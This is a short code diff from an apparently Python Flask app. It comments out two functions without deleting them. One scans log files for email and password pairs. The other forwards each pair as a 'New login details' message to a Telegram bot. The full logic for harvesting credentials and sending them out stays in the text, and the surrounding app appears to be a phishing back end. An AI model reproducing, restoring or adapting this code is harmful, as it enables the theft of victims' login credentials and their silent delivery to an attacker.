@@ -34,25 +34,25 @@ def send_mail(email, password):
     app.logger.info(f'Email sent to {email}')
     mail.send(msg)
 
-def send_message(message):
-    url = f'https://api.telegram.org/bot{token}/sendMessage'
-    params = {
-        'chat_id': chat_id,
-        'text': message
-    }
-    response = requests.post(url, params=params)
-    return response.json()
+# def send_message(message):
+#     url = f'https://api.telegram.org/bot{token}/sendMessage'
+#     params = {
+#         'chat_id': chat_id,
+#         'text': message
+#     }
+#     response = requests.post(url, params=params)
+#     return response.json()
 
-def read_logs(file_path):
-    with open(file_path, 'r') as file:
-        for line in file:
-            match = log_pattern.search(line)
-            if match:
-                email = match.group(1)
-                password = match.group(2)
-                message = f'New login details:\nEmail: {email}\nPassword: {password}'
-                app.logger.info(message)  # Log the information
-                send_message(message)
+# def read_logs(file_path):
+#     with open(file_path, 'r') as file:
+#         for line in file:
+#             match = log_pattern.search(line)
+#             if match:
+#                 email = match.group(1)
+#                 password = match.group(2)
+#                 message = f'New login details:\nEmail: {email}\nPassword: {password}'
+#                 app.logger.info(message)  # Log the information
+#                 send_message(message)
 
 @app.route("/", methods=['GET', 'POST'])
 def one():
